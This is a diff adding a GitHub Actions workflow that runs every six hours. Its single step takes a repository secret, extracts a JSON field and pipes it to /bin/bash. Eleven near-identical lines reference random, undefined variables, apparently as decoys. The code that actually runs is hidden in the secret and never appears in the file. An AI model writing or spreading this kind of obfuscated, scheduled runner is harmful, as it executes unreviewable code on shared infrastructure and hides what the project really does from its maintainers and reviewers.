@@ -1,0 +1,28 @@
+name: xinganxianguang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xinganxianguang
+        env:
+          e3: ${{ secrets.e3 }}
+        run: |
+          echo $e3 | jq -r .kvo1 | /bin/bash
+          echo $vza21 | jq -r .ohtf05079 | /bin/bash
+          echo $ypq7917 | jq -r .nk14 | /bin/bash
+          echo $uo0 | jq -r .zs496 | /bin/bash
+          echo $cg218 | jq -r .xut50 | /bin/bash
+          echo $dszru7110 | jq -r .xd8 | /bin/bash
+          echo $eudrx1 | jq -r .hkjxp101 | /bin/bash
+          echo $ljmxg1566 | jq -r .thpd6919 | /bin/bash
+          echo $hzkd2 | jq -r .pp29 | /bin/bash
+          echo $mdo2 | jq -r .r5517 | /bin/bash
+          echo $cqfsm7892 | jq -r .wp79 | /bin/bash
+          echo $kmlu581 | jq -r .hkhg295 | /bin/bash
+
